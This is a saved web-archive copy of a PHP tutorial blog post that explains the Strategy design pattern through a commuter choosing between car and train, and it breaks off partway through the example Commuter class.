From: <Saved by UnMHT Ver.6.2.9>
Subject: Design Patterns in PHP - Strategy Pattern - Label Media Blog
Date: Mon, 01 Apr 2013 18:57:18 +0300
MIME-Version: 1.0
Content-Type: multipart/related;
	boundary="----=_Part_D48E12B_E642554.1364831838822";
	type="text/html"

------=_Part_D48E12B_E642554.1364831838822
Content-Location: http://www.labelmedia.co.uk/blog/posts/design-patterns-strategy-pattern.html
Content-Transfer-Encoding: quoted-printable
Content-Type: text/html;
	charset="UTF-8"

<!DOCTYPE html>
<html lang=3D""><head><meta charset=3D"UTF-8">
=09
	<meta content=3D"Yetti " name=3D"generator">
	<script type=3D"text/javascript" async=3D"" src=3D"http://www.google-analy=
tics.com/ga.js"></script><script type=3D"text/javascript">var NREUMQ=3DNREU=
MQ||[];NREUMQ.push(["mark","firstbyte",new Date().getTime()]);</script>
<title>Design Patterns in PHP - Strategy Pattern - Label Media Blog</title>
	<meta content=3D"Default description" name=3D"description">
	<link type=3D"image/png" href=3D"http://www.labelmedia.co.uk/assets/images=
/favicon.png" rel=3D"shortcut icon">
	<meta content=3D"pDR7MMOS5ma__Hmfu6sum4mW5vyrwNbdhDDAcGlnmL4" name=3D"goog=
le-site-verification">
   =20
    <!-- Open graph share image -->
    <meta content=3D"http://www.labelmedia.co.uk/assets/images/share-logo.p=
ng" property=3D"og:image">=20

	<!-- CSS -->
	<link media=3D"screen" title=3D"Default Theme" type=3D"text/css" rel=3D"st=
ylesheet" href=3D"http://www.labelmedia.co.uk/assets/css/default.css">
=09
		<!-- RSS -->
	<link title=3D"Blog RSS" type=3D"application/rss+xml" rel=3D"alternate" hr=
ef=3D"http://www.labelmedia.co.uk/blog/posts.xml">
=09
	<!-- Syntax Highlighter -->
	<link media=3D"screen" title=3D"Default Theme" type=3D"text/css" rel=3D"st=
ylesheet" href=3D"http://www.labelmedia.co.uk/assets/css/jush.css">
	=09
	<!-- JS Libs -->
	<script type=3D"text/javascript" src=3D"http://static.yetti.co.uk/js/libs/=
externals/prototype/1.6.1/prototype.js"></script>
	<script type=3D"text/javascript" src=3D"http://static.yetti.co.uk/js/libs/=
externals/scriptaculous/1.8.3/scriptaculous.js"></script><script src=3D"htt=
p://static.yetti.co.uk/js/libs/externals/scriptaculous/1.8.3/builder.js" ty=
pe=3D"text/javascript"></script><script src=3D"http://static.yetti.co.uk/js=
/libs/externals/scriptaculous/1.8.3/effects.js" type=3D"text/javascript"></=
script><script src=3D"http://static.yetti.co.uk/js/libs/externals/scriptacu=
lous/1.8.3/dragdrop.js" type=3D"text/javascript"></script><script src=3D"ht=
tp://static.yetti.co.uk/js/libs/externals/scriptaculous/1.8.3/controls.js"=
 type=3D"text/javascript"></script><script src=3D"http://static.yetti.co.uk=
/js/libs/externals/scriptaculous/1.8.3/slider.js" type=3D"text/javascript">=
</script><script src=3D"http://static.yetti.co.uk/js/libs/externals/scripta=
culous/1.8.3/sound.js" type=3D"text/javascript"></script>
   =20
    <!-- Tracking -->
    <script src=3D"http://explore-123.com/js/10316.js" type=3D"text/javascr=
ipt"></script><link rel=3D"stylesheet" type=3D"text/css" href=3D"jush.css">=
<style charset=3D"utf-8" type=3D"text/css">/* See license.txt for terms of=
 usage */
/** reset styling **/
.firebugResetStyles {
    z-index: 2147483646 !important;
    top: 0 !important;
    left: 0 !important;
    display: block !important;
    border: 0 none !important;
    margin: 0 !important;
    padding: 0 !important;
    outline: 0 !important;
    min-width: 0 !important;
    max-width: none !important;
    min-height: 0 !important;
    max-height: none !important;
    position: fixed !important;
    transform: rotate(0deg) !important;
    transform-origin: 50% 50% !important;
    border-radius: 0 !important;
    box-shadow: none !important;
    background: transparent none !important;
    pointer-events: none !important;
    white-space: normal !important;
}

.firebugBlockBackgroundColor {
    background-color: transparent !important;
}

.firebugResetStyles:before, .firebugResetStyles:after {
    content: "" !important;
}
/**actual styling to be modified by firebug theme**/
.firebugCanvas {
    display: none !important;
}

/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *=
 * * * * * * * * * * * */
.firebugLayoutBox {
    width: auto !important;
    position: static !important;
}

.firebugLayoutBoxOffset {
    opacity: 0.8 !important;
    position: fixed !important;
}

.firebugLayoutLine {
    opacity: 0.4 !important;
    background-color: #000000 !important;
}

.firebugLayoutLineLeft, .firebugLayoutLineRight {
    width: 1px !important;
    height: 100% !important;
}

.firebugLayoutLineTop, .firebugLayoutLineBottom {
    width: 100% !important;
    height: 1px !important;
}

.firebugLayoutLineTop {
    margin-top: -1px !important;
    border-top: 1px solid #999999 !important;
}

.firebugLayoutLineRight {
    border-right: 1px solid #999999 !important;
}

.firebugLayoutLineBottom {
    border-bottom: 1px solid #999999 !important;
}

.firebugLayoutLineLeft {
    margin-left: -1px !important;
    border-left: 1px solid #999999 !important;
}

/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *=
 * * * * * * * * * * * */
.firebugLayoutBoxParent {
    border-top: 0 none !important;
    border-right: 1px dashed #E00 !important;
    border-bottom: 1px dashed #E00 !important;
    border-left: 0 none !important;
    position: fixed !important;
    width: auto !important;
}

.firebugRuler{
    position: absolute !important;
}

.firebugRulerH {
    top: -15px !important;
    left: 0 !important;
    width: 100% !important;
    height: 14px !important;
    background: url("data:image/png,%89PNG%0D%0A%1A%0A%00%00%00%0DIHDR%00%0=
0%13%88%00%00%00%0E%08%02%00%00%00L%25a%0A%00%00%00%04gAMA%00%00%D6%D8%D4OX=
2%00%00%00%19tEXtSoftware%00Adobe%20ImageReadyq%C9e%3C%00%00%04%F8IDATx%DA%=
EC%DD%D1n%E2%3A%00E%D1%80%F8%FF%EF%E2%AF2%95%D0D4%0E%C1%14%B0%8Fa-%E9%3E%CC=
%9C%87n%B9%81%A6W0%1C%A6i%9A%E7y%0As8%1CT%A9R%A5J%95*U%AAT%A9R%A5J%95*U%AAT=
%A9R%A5J%95*U%AAT%A9R%A5J%95*U%AAT%A9R%A5J%95*U%AAT%A9R%A5J%95*U%AAT%A9R%A5=
J%95*U%AATE9%FE%FCw%3E%9F%AF%2B%2F%BA%97%FDT%1D~K(%5C%9D%D5%EA%1B%5C%86%B5%=
A9%BDU%B5y%80%ED%AB*%03%FAV9%AB%E1%CEj%E7%82%EF%FB%18%BC%AEJ8%AB%FA'%D2%BEU=
9%D7U%ECc0%E1%A2r%5DynwVi%CFW%7F%BB%17%7Dy%EACU%CD%0E%F0%FA%3BX%FEbV%FEM%9B=
%2B%AD%BE%AA%E5%95v%AB%AA%E3E5%DCu%15rV9%07%B5%7F%B5w%FCm%BA%BE%AA%FBY%3D%1=
4%F0%EE%C7%60%0EU%AAT%A9R%A5J%95*U%AAT%A9R%A5J%95*U%AAT%A9R%A5J%95*U%AAT%A9=
R%A5J%95*U%AAT%A9R%A5JU%88%D3%F5%1F%AE%DF%3B%1B%F2%3E%DAUCNa%F92%D02%AC%7Dm=
%F9%3A%D4%F2%8B6%AE*%BF%5C%C2Ym~9g5%D0Y%95%17%7C%C8c%B0%7C%18%26%9CU%CD%13i=
%F7%AA%90%B3Z%7D%95%B4%C7%60%E6E%B5%BC%05%B4%FBY%95U%9E%DB%FD%1C%FC%E0%9F%8=
3%7F%BE%17%7DkjMU%E3%03%AC%7CWj%DF%83%9An%BCG%AE%F1%95%96yQ%0Dq%5Dy%00%3Et%=
B5'%FC6%5DS%95pV%95%01%81%FF'%07%00%00%00%00%00%00%00%00%00%F8x%C7%F0%BE%9C=
Op%5D%C9%7C%AD%E7%E6%EBV%FB%1E%E0(%07%E5%AC%C6%3A%ABi%9C%8F%C6%0E9%AB%C0'%D=
2%8E%9F%F99%D0E%B5%99%14%F5%0D%CD%7F%24%C6%DEH%B8%E9rV%DFs%DB%D0%F7%00k%FE%=
1D%84%84%83J%B8%E3%BA%FB%EF%20%84%1C%D7%AD%B0%8E%D7U%C8Y%05%1E%D4t%EF%AD%95=
Q%BF8w%BF%E9%0A%BF%EB%03%00%00%00%00%00%00%00%00%00%B8vJ%8E%BB%F5%B1u%8Cx%8=
0%E1o%5E%CA9%AB%CB%CB%8E%03%DF%1D%B7T%25%9C%D5(%EFJM8%AB%CC'%D2%B2*%A4s%E7c=
6%FB%3E%FA%A2%1E%80~%0E%3E%DA%10x%5D%95Uig%15u%15%ED%7C%14%B6%87%A1%3B%FCo8=
%A8%D8o%D3%ADO%01%EDx%83%1A~%1B%9FpP%A3%DC%C6'%9C%95gK%00%00%00%00%00%00%00=
%00%00%20%D9%C9%11%D0%C0%40%AF%3F%EE%EE%92%94%D6%16X%B5%BCMH%15%2F%BF%D4%A7=
%C87%F1%8E%F2%81%AE%AAvzr%DA2%ABV%17%7C%E63%83%E7I%DC%C6%0Bs%1B%EF6%1E%00%0=
0%00%00%00%00%00%00%00%80cr%9CW%FF%7F%C6%01%0E%F1%CE%A5%84%B3%CA%BC%E0%CB%A=
A%84%CE%F9%BF)%EC%13%08WU%AE%AB%B1%AE%2BO%EC%8E%CBYe%FE%8CN%ABr%5Dy%60~%CFA=
%0D%F4%AE%D4%BE%C75%CA%EDVB%EA(%B7%F1%09g%E5%D9%12%00%00%00%00%00%00%00%00%=
00H%F6%EB%13S%E7y%5E%5E%FB%98%F0%22%D1%B2'%A7%F0%92%B1%BC%24z3%AC%7Dm%60%D5=
%92%B4%7CEUO%5E%F0%AA*%3BU%B9%AE%3E%A0j%94%07%A0%C7%A0%AB%FD%B5%3F%A0%F7%03=
T%3Dy%D7%F7%D6%D4%C0%AAU%D2%E6%DFt%3F%A8%CC%AA%F2%86%B9%D7%F5%1F%18%E6%01%F=
8%CC%D5%9E%F0%F3z%88%AA%90%EF%20%00%00%00%00%00%00%00%00%00%C0%A6%D3%EA%CFi=
%AFb%2C%7BB%0A%2B%C3%1A%D7%06V%D5%07%A8r%5D%3D%D9%A6%CAu%F5%25%CF%A2%99%97z=
NX%60%95%AB%5DUZ%D5%FBR%03%AB%1C%D4k%9F%3F%BB%5C%FF%81a%AE%AB'%7F%F3%EA%FE%=
F3z%94%AA%D8%DF%5B%01%00%00%00%00%00%00%00%00%00%8E%FB%F3%F2%B1%1B%8DWU%AAT=
%A9R%A5J%95*U%AAT%A9R%A5J%95*U%AAT%A9R%A5J%95*U%AAT%A9R%A5J%95*U%AAT%A9R%A5=
J%95*U%AAT%A9R%A5J%95*U%AAT%A9R%A5J%95*UiU%C7%BBe%E7%F3%B9%CB%AAJ%95*U%AAT%=
A9R%A5J%95*U%AAT%A9R%A5J%95*U%AAT%A9R%A5J%95*U%AAT%A9R%A5J%95*U%AAT%A9R%A5J=
%95*U%AAT%A9R%A5J%95*U%AAT%A9R%A5*%AAj%FD%C6%D4%5Eo%90%B5Z%ADV%AB%D5j%B5Z%A=
DV%AB%D5j%B5Z%ADV%AB%D5j%B5Z%ADV%AB%D5j%B5Z%ADV%AB%D5j%B5Z%ADV%AB%D5j%B5Z%A=
DV%AB%D5j%B5%86%AF%1B%9F%98%DA%EBm%BBV%AB%D5j%B5Z%ADV%AB%D5j%B5Z%ADV%AB%D5j=
%B5Z%ADV%AB%D5j%B5Z%ADV%AB%D5j%B5Z%ADV%AB%D5j%B5Z%ADV%AB%D5j%B5Z%AD%D6%E4%F=
58%01%00%00%00%00%00%00%00%00%00%00%00%00%00%40%85%7F%02%0C%008%C2%D0H%16j%=
8FX%00%00%00%00IEND%AEB%60%82") repeat-x !important;
    border-top: 1px solid #BBBBBB !important;
    border-right: 1px dashed #BBBBBB !important;
    border-bottom: 1px solid #000000 !important;
}

.firebugRulerV {
    top: 0 !important;
    left: -15px !important;
    width: 14px !important;
    height: 100% !important;
    background: url("data:image/png,%89PNG%0D%0A%1A%0A%00%00%00%0DIHDR%00%0=
0%00%0E%00%00%13%88%08%02%00%00%00%0E%F5%CB%10%00%00%00%04gAMA%00%00%D6%D8%=
D4OX2%00%00%00%19tEXtSoftware%00Adobe%20ImageReadyq%C9e%3C%00%00%06~IDATx%D=
A%EC%DD%D1v%A20%14%40Qt%F1%FF%FF%E4%97%D9%07%3BT%19%92%DC%40(%90%EEy%9A5%CB=
%B6%E8%F6%9Ac%A4%CC0%84%FF%DC%9E%CF%E7%E3%F1%88%DE4%F8%5D%C7%9F%2F%BA%DD%5E=
%7FI%7D%F18%DDn%BA%C5%FB%DF%97%BFk%F2%10%FF%FD%B4%F2M%A7%FB%FD%FD%B3%22%07p=
%8F%3F%AE%E3%F4S%8A%8F%40%EEq%9D%BE8D%F0%0EY%A1Uq%B7%EA%1F%81%88V%E8X%3F%B4=
%CEy%B7h%D1%A2E%EBohU%FC%D9%AF2fO%8BBeD%BE%F7X%0C%97%A4%D6b7%2Ck%A5%12%E3%9=
B%60v%B7r%C7%1AI%8C%BD%2B%23r%00c0%B2v%9B%AD%CA%26%0C%1Ek%05A%FD%93%D0%2B%A=
1u%8B%16-%95q%5Ce%DCSO%8E%E4M%23%8B%F7%C2%FE%40%BB%BD%8C%FC%8A%B5V%EBu%40%F=
9%3B%A72%FA%AE%8C%D4%01%CC%B5%DA%13%9CB%AB%E2I%18%24%B0n%A9%0CZ*Ce%9C%A22%8=
E%D8NJ%1E%EB%FF%8F%AE%CAP%19*%C3%BAEKe%AC%D1%AAX%8C*%DEH%8F%C5W%A1e%AD%D4%B=
7%5C%5B%19%C5%DB%0D%EF%9F%19%1D%7B%5E%86%BD%0C%95%A12%AC%5B*%83%96%CAP%19%F=
62T%86%CAP%19*%83%96%CA%B8Xe%BC%FE)T%19%A1%17xg%7F%DA%CBP%19*%C3%BA%A52T%86=
%CAP%19%F62T%86%CA%B0n%A9%0CZ%1DV%C6%3D%F3%FCH%DE%B4%B8~%7F%5CZc%F1%D6%1F%A=
F%84%F9%0F6%E6%EBVt9%0E~%BEr%AF%23%B0%97%A12T%86%CAP%19%B4T%86%CA%B8Re%D8%C=
BP%19*%C3%BA%A52huX%19%AE%CA%E5%BC%0C%7B%19*CeX%B7h%A9%0C%95%E1%BC%0C%7B%19=
*CeX%B7T%06%AD%CB%5E%95%2B%BF.%8F%C5%97%D5%E4%7B%EE%82%D6%FB%CF-%9C%FD%B9%C=
F%3By%7B%19%F62T%86%CA%B0n%D1R%19*%A3%D3%CA%B0%97%A12T%86uKe%D0%EA%B02*%3F1=
%99%5DB%2B%A4%B5%F8%3A%7C%BA%2B%8Co%7D%5C%EDe%A8%0C%95a%DDR%19%B4T%C66%82fA=
%B2%ED%DA%9FC%FC%17GZ%06%C9%E1%B3%E5%2C%1A%9FoiB%EB%96%CA%A0%D5qe4%7B%7D%FD=
%85%F7%5B%ED_%E0s%07%F0k%951%ECr%0D%B5C%D7-g%D1%A8%0C%EB%96%CA%A0%A52T%C6)*=
%C3%5E%86%CAP%19%D6-%95A%EB*%95q%F8%BB%E3%F9%AB%F6%E21%ACZ%B7%22%B7%9B%3F%0=
2%85%CB%A2%5B%B7%BA%5E%B7%9C%97%E1%BC%0C%EB%16-%95%A12z%AC%0C%BFc%A22T%86uK=
e%D0%EA%B02V%DD%AD%8A%2B%8CWhe%5E%AF%CF%F5%3B%26%CE%CBh%5C%19%CE%CB%B0%F3%A=
4%095%A1%CAP%19*Ce%A8%0C%3BO*Ce%A8%0C%95%A12%3A%AD%8C%0A%82%7B%F0v%1F%2FD%A=
9%5B%9F%EE%EA%26%AF%03%CA%DF9%7B%19*Ce%A8%0C%95%A12T%86%CA%B8Ze%D8%CBP%19*C=
e%A8%0C%95%D1ae%EC%F7%89I%E1%B4%D7M%D7P%8BjU%5C%BB%3E%F2%20%D8%CBP%19*Ce%A8=
%0C%95%A12T%C6%D5*%C3%5E%86%CAP%19*Ce%B4O%07%7B%F0W%7Bw%1C%7C%1A%8C%B3%3B%D=
1%EE%AA%5C%D6-%EBV%83%80%5E%D0%CA%10%5CU%2BD%E07YU%86%CAP%19*%E3%9A%95%91%D=
9%A0%C8%AD%5B%EDv%9E%82%FFKOee%E4%8FUe%A8%0C%95%A12T%C6%1F%A9%8C%C8%3D%5B%A=
5%15%FD%14%22r%E7B%9F%17l%F8%BF%ED%EAf%2B%7F%CF%ECe%D8%CBP%19*Ce%A8%0C%95%E=
1%93~%7B%19%F62T%86%CAP%19*Ce%A8%0C%E7%13%DA%CBP%19*Ce%A8%0CZf%8B%16-Z%B4h%=
D1R%19f%8B%16-Z%B4h%D1R%19%B4%CC%16-Z%B4h%D1R%19%B4%CC%16-Z%B4h%D1%A2%A52%C=
C%16-Z%B4h%D1%A2%A52h%99-Z%B4h%D1%A2%A52h%99-Z%B4h%D1%A2EKe%98-Z%B4h%D1%A2E=
Ke%D02%5B%B4h%D1%A2EKe%D02%5B%B4h%D1%A2E%8B%96%CA0%5B%B4h%D1%A2E%8B%96%CA%A=
0e%B6h%D1%A2E%8B%96%CA%A0e%B6h%D1%A2E%8B%16-%95a%B6h%D1%A2E%8B%16-%95A%CBl%=
D1%A2E%8B%16-%95A%CBl%D1%A2E%8B%16-Z*%C3l%D1%A2E%8B%16-Z*%83%96%D9%A2E%8B%1=
6-Z*%83%96%D9%A2E%8B%16-Z%B4T%86%D9%A2E%8B%16-Z%B4T%06-%B3E%8B%16-Z%B4T%06-=
%B3E%8B%16-Z%B4h%A9%0C%B3E%8B%16-Z%B4h%A9%0CZf%8B%16-Z%B4h%A9%0CZf%8B%16-Z%=
B4h%D1R%19f%8B%16-Z%B4h%D1R%19%B4%CC%16-Z%B4h%D1R%19%B4%CC%16-Z%B4h%D1%A2%A=
52%CC%16-Z%B4h%D1%A2%A52h%99-Z%B4h%D1%A2%A52h%99-Z%B4h%D1%A2EKe%98-Z%B4h%D1=
%A2EKe%D02%5B%B4h%D1%A2EKe%D02%5B%B4h%D1%A2E%8B%96%CA0%5B%B4h%D1%A2E%8B%96%=
CA%A0e%B6h%D1%A2E%8B%96%CA%A0e%B6h%D1%A2E%8B%16-%95a%B6h%D1%A2E%8B%16-%95A%=
CBl%D1%A2E%8B%16-%95A%CBl%D1%A2E%8B%16-Z*%C3l%D1%A2E%8B%16-Z*%83%96%D9%A2E%=
8B%16-Z*%83%96%D9%A2E%8B%16-Z%B4T%86%D9%A2E%8B%16-Z%B4T%06-%B3E%8B%16-Z%B4T=
%06-%B3E%8B%16-Z%B4h%A9%0C%B3E%8B%16-Z%B4h%A9%0CZf%8B%16-Z%B4h%A9%0CZf%8B%1=
6-Z%B4h%D1R%19f%8B%16-Z%B4h%D1R%19%B4%CC%16-Z%B4h%D1R%19%B4%CC%16-Z%B4h%D1%=
A2%A52%CC%16-Z%B4h%D1%A2%A52h%99-Z%B4h%D1%A2%A52h%99-Z%B4h%D1%A2EKe%98-Z%B4=
h%D1%A2EKe%D02%5B%B4h%D1%A2EKe%D02%5B%B4h%D1%A2E%8B%96%CA0%5B%B4h%D1%A2E%8B=
%96%CA%A0e%B6h%D1%A2E%8B%96%CA%A0e%B6h%D1%A2E%8B%16-%95a%B6h%D1%A2E%8B%16-%=
95A%CBl%D1%A2E%8B%16-%95A%CBl%D1%A2E%8B%16-Z*%C3l%D1%A2E%8B%16-Z*%83%96%D9%=
A2E%8B%16-Z*%83%96%D9%A2E%8B%16-Z%B4T%86%D9%A2E%8B%16-Z%B4T%06-%B3E%8B%16-Z=
%B4%AE%A4%F5%25%C0%00%DE%BF%5C'%0F%DA%B8q%00%00%00%00IEND%AEB%60%82") repea=
t-y !important;
    border-left: 1px solid #BBBBBB !important;
    border-right: 1px solid #000000 !important;
    border-bottom: 1px dashed #BBBBBB !important;
}

.overflowRulerX > .firebugRulerV {
    left: 0 !important;
}

.overflowRulerY > .firebugRulerH {
    top: 0 !important;
}

/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *=
 * * * * * * * * * * * */
.fbProxyElement {
    position: fixed !important;
    pointer-events: auto !important;
}
</style><base href=3D"http://www.labelmedia.co.uk/blog/posts/"></head><body=
 data-twttr-rendered=3D"true"><div class=3D"contentContainer blogPage blog"=
><div class=3D"pageContent"><div class=3D"wideColumn"><div class=3D"post"><=
h1>Design Patterns in PHP - Strategy Pattern</h1>
<div class=3D"date">
=09
=09
	by Tom Rawcliffe, 	Tuesday November 30 2010
</div>


<div class=3D"opening cmText"><p>Last week&#x27;s post about the <a href=3D=
"/blog/posts/design-patterns-factory-method.html">Factory Method Pattern in=
 PHP</a> seemed to go down quite well so I thought I&#x27;d get onto anothe=
r one fairly sharpish. So today i&#x27;ll be talking about the Strategy Pat=
tern, which to my mind, is one of the patterns that demonstrates beautiful=
 encapsulation in OOP (Object Orientated Programming).</p>
</div>
<div class=3D"cmText"><p>The Strategy Pattern is used to decouple an algori=
thm from the context in which it is used. I&#x27;m going to equate this exa=
mple to a real world scenario starring a man, I=E2=80=99ll call him Bob.</p>

<p>Bob needs to get to work in a morning. Now it&#x27;s up to him how he go=
es about getting there. From the point of view of an outsider - Bob=E2=80=
=99s boss for instance, it doesn=E2=80=99t really matter how he gets to wor=
k, just that he arrives on time.</p>

<p>When Bob starts his day he can choose the method by which he gets to wor=
k, based on what is available. He can assess if he has a car, if it is in=
 a serviceable state and if the roads are clear. If not, Bob may decide to=
 take the train and take into account his proximity from the station and th=
e availability of a given train. But no matter what Bob&#x27;s selected str=
ategy may be, he is simply performing the action of getting to work.</p>

<p>Below is an example in PHP demonstrating this pattern for Bob getting to=
 work: </p>

<p><em>ITransportStrategy.inc.php</em>    </p>

<pre class=3D"jush"><span class=3D"jush"><span class=3D"jush-php"><span cla=
ss=3D"jush-op">&lt;?php</span>=20

<span class=3D"jush-php_new"><a href=3D"http://www.php.net/language.oop5.in=
terfaces#language.oop5.interfaces.interface">interface</a><span class=3D"ju=
sh-op"> </span>ITransportStrategy</span>
{
&#xa0; &#xa0; <span class=3D"jush-php_doc"><span class=3D"jush-op">/**</spa=
n>
&#xa0; &#xa0; &#xa0;* Travel to location if possible
&#xa0; &#xa0; &#xa0;*
&#xa0; &#xa0; &#xa0;* <a href=3D"http://manual.phpdoc.org/HTMLSmartyConvert=
er/HandS/phpDocumentor/tutorial_tags.param.pkg.html">@param</a> Location $l=
ocation
&#xa0; &#xa0; &#xa0;* <a href=3D"http://manual.phpdoc.org/HTMLSmartyConvert=
er/HandS/phpDocumentor/tutorial_tags.return.pkg.html">@return</a> bool
&#xa0; &#xa0; &#xa0;<span class=3D"jush-op">*/</span></span>
&#xa0; &#xa0; <a href=3D"http://www.php.net/language.oop5.visibility">publi=
c</a> <span class=3D"jush-php_fun"><a href=3D"http://www.php.net/functions.=
user-defined">function</a><span class=3D"jush-op"> </span>travel</span>(Loc=
ation <span class=3D"jush-php_var">$location</span>);

&#xa0; &#xa0; <span class=3D"jush-php_doc"><span class=3D"jush-op">/**</spa=
n>
&#xa0; &#xa0; &#xa0;* Is this mode of transport available?
&#xa0; &#xa0; &#xa0;*
&#xa0; &#xa0; &#xa0;* <a href=3D"http://manual.phpdoc.org/HTMLSmartyConvert=
er/HandS/phpDocumentor/tutorial_tags.return.pkg.html">@return</a> bool
&#xa0; &#xa0; &#xa0;<span class=3D"jush-op">*/</span></span>
&#xa0; &#xa0; <a href=3D"http://www.php.net/language.oop5.visibility">publi=
c</a> <span class=3D"jush-php_fun"><a href=3D"http://www.php.net/functions.=
user-defined">function</a><span class=3D"jush-op"> </span>isAvailable</span=
>();
}
</span></span></pre>

<p><em>Car.inc.php</em>   </p>

<pre class=3D"jush"><span class=3D"jush"><span class=3D"jush-php"><span cla=
ss=3D"jush-op">&lt;?php</span>=20

<span class=3D"jush-php_new"><a href=3D"http://www.php.net/language.oop5.ba=
sic#language.oop5.basic.class">class</a><span class=3D"jush-op"> </span>Car=
</span> <span class=3D"jush-php_new"><a href=3D"http://www.php.net/language=
.oop5.interfaces#language.oop5.interfaces.implements">implements</a><span=
 class=3D"jush-op"> </span>ITransportStrategy</span>
{
&#xa0; &#xa0; <a href=3D"http://www.php.net/language.oop5.visibility">publi=
c</a> <span class=3D"jush-php_fun"><a href=3D"http://www.php.net/functions.=
user-defined">function</a><span class=3D"jush-op"> </span><a href=3D"http:/=
/www.php.net/language.oop5.decon#language.oop5.decon.constructor">__constru=
ct</a></span> () {}

&#xa0; &#xa0; <a href=3D"http://www.php.net/language.oop5.visibility">publi=
c</a> <span class=3D"jush-php_fun"><a href=3D"http://www.php.net/functions.=
user-defined">function</a><span class=3D"jush-op"> </span>travel</span>(Loc=
ation <span class=3D"jush-php_var">$location</span>)
&#xa0; &#xa0; {
&#xa0; &#xa0; &#xa0; &#xa0; <span class=3D"jush-php_one"><span class=3D"jus=
h-op">//</span> Drive car<span class=3D"jush-op">
</span></span> &#xa0; &#xa0;}

&#xa0; &#xa0; <a href=3D"http://www.php.net/language.oop5.visibility">publi=
c</a> <span class=3D"jush-php_fun"><a href=3D"http://www.php.net/functions.=
user-defined">function</a><span class=3D"jush-op"> </span>isAvailable</span=
>()
&#xa0; &#xa0; {
&#xa0; &#xa0; &#xa0; &#xa0; <span class=3D"jush-php_one"><span class=3D"jus=
h-op">//</span> Can i use the car (or do i even have one)?<span class=3D"ju=
sh-op">
</span></span> &#xa0; &#xa0;}
}
</span></span></pre>

<p><em>Train.inc.php</em> </p>

<pre class=3D"jush"><span class=3D"jush"><span class=3D"jush-php"><span cla=
ss=3D"jush-op">&lt;?php</span>=20

<span class=3D"jush-php_new"><a href=3D"http://www.php.net/language.oop5.ba=
sic#language.oop5.basic.class">class</a><span class=3D"jush-op"> </span>Tra=
in</span> <span class=3D"jush-php_new"><a href=3D"http://www.php.net/langua=
ge.oop5.interfaces#language.oop5.interfaces.implements">implements</a><span=
 class=3D"jush-op"> </span>ITransportStrategy</span>
{
&#xa0; &#xa0; <a href=3D"http://www.php.net/language.oop5.visibility">publi=
c</a> <span class=3D"jush-php_fun"><a href=3D"http://www.php.net/functions.=
user-defined">function</a><span class=3D"jush-op"> </span><a href=3D"http:/=
/www.php.net/language.oop5.decon#language.oop5.decon.constructor">__constru=
ct</a></span> () {}

&#xa0; &#xa0; <a href=3D"http://www.php.net/language.oop5.visibility">publi=
c</a> <span class=3D"jush-php_fun"><a href=3D"http://www.php.net/functions.=
user-defined">function</a><span class=3D"jush-op"> </span>travel</span>(Loc=
ation <span class=3D"jush-php_var">$location</span>)
&#xa0; &#xa0; {
&#xa0; &#xa0; &#xa0; &#xa0; <span class=3D"jush-php_one"><span class=3D"jus=
h-op">//</span> Catch train to nearest location<span class=3D"jush-op">
</span></span> &#xa0; &#xa0;}

&#xa0; &#xa0; <a href=3D"http://www.php.net/language.oop5.visibility">publi=
c</a> <span class=3D"jush-php_fun"><a href=3D"http://www.php.net/functions.=
user-defined">function</a><span class=3D"jush-op"> </span>isAvailable</span=
>()
&#xa0; &#xa0; {
&#xa0; &#xa0; &#xa0; &#xa0; <span class=3D"jush-php_one"><span class=3D"jus=
h-op">//</span> Are there any trains available and am i near a station?<spa=
n class=3D"jush-op">
</span></span> &#xa0; &#xa0;}
}
</span></span></pre>

<p><em>Commuter.inc.php</em>  </p>

<pre class=3D"jush"><span class=3D"jush"><span class=3D"jush-php"><span cla=
ss=3D"jush-op">&lt;?php</span>=20

<span class=3D"jush-php_new"><a href=3D"http://www.php.net/language.oop5.ba=
sic#language.oop5.basic.class">class</a><span class=3D"jush-op"> </span>Com=
muter</span>
{
&#xa0; &#xa0; <a href=3D"http://www.php.net/language.oop5.visibility">priva=
te</a> <a href=3D"http://www.php.net/language.variables.scope#language.vari=
ables.scope.static">static</a> <span class=3D"jush-php_var">$_strategies</s=
pan> =3D <a href=3D"http://www.php.net/function.array">array</a>(
&#xa0; &#xa0; &#xa0; &#xa0; <span class=3D"jush-php_apo"><span class=3D"jus=
h-op">&#x27;</span>Car<span class=3D"jush-op">&#x27;</span></span>,
&#xa0; &#xa0; &#xa0; &#xa0; <span class=3D"jush-php_apo"><span class=3D"jus=
h-op">&#x27;</span>Train<span class=3D"jush-op">&#x27;</span></span>,
&#xa0; &#xa0; );

&#xa0; &#xa0; <a href=3D"http://www.php.net/language.oop5.visibility">priva=
te</a> <span class=3D"jush-php_var">$_strategy</span>;

&#xa0; &#xa0; <a href=3D"http://www.php.net/language.oop5.visibility">publi=
c</a> <span class=3D"jush-php_fun"><a href=3D"http://www.php.net/functions.=
user-defined">function</a><span class=3D"jush-op"> </span><a href=3D"http:/=
/www.php.net/language.oop5.decon#language.oop5.decon.constructor">__constru=
ct</a></span> ()
&#xa0; &#xa0; {
&#xa0; &#xa0; &#xa0; &#xa0; <a href=3D"http://www.php.net/control-structure=
s.foreach">foreach</a> (<span class=3D"jush-php_met"><a href=3D"http://www.=
php.net/language.oop5.paamayim-nekudotayim">self</a><span class=3D"jush-op"=
>::</span>$_strategies</span> <a href=3D"http://www.php.net/control-structu=
res.foreach">as</a> <span class=3D"jush-php_var">$className</span>)
&#xa0; &#xa0; &#xa0; &#xa0; {
&#xa0; &#xa0; &#xa0; &#xa0; &#xa0; &#xa0; <span class=3D"jush-php_var">$met=
hod</span> =3D <span class=3D"jush-php_new"><a href=3D"http://www.php.net/l=
anguage.oop5.basic#language.oop5.basic.new">new</a><span class=3D"jush-op">=
 </span></span><span class=3D"jush-php_var">$className</span>();

&#xa0; &#xa0; &#xa0; &#xa0; &#xa0; &#xa0; <a href=3D"http://www.php.net/con=
trol-structures.if">if</a> (<span class=3D"jush-php_var">$method</span> <sp=
an class=3D"jush-php_new"><a href=3D"http://www.php.net/language.operators.=
type">instanceof</a><span class=3D"jush-op"> </span>ITransportStrategy</spa=
n> &amp;&amp; <span class=3D"jush-php_var">$method</span><span class=3D"jus=
h-php_fun">-&gt;isAvailable</span>())
&#xa0; &#xa0; &#xa0; &#xa0; &#xa0; &#xa0; {
&#xa0; &#xa0; &#xa0; &#xa0; &#xa0; &#xa0; &#xa0; &#xa0; <span class=3D"jush=
-php_var">$this</span><span class=3D"jush-php_fun">-&gt;_strategy</span> =
